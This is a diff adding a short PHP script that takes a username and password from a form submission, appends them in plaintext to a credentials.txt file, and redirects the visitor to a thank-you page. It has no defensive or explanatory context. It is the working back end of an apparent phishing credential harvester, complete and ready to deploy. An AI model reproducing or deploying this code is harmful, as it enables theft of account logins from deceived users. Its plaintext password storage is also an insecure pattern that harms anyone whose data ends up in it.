@@ -1,0 +1,16 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    // Append the credentials to a text file
+    $file = 'credentials.txt';
+    $current = file_get_contents($file);
+    $current .= "Username: $username\nPassword: $password\n\n";
+    file_put_contents($file, $current);
+
+    // Redirect to a thank you page
+    header('Location: thank_you.html'); // Ensure this file exists
+    exit();
+}
+?>
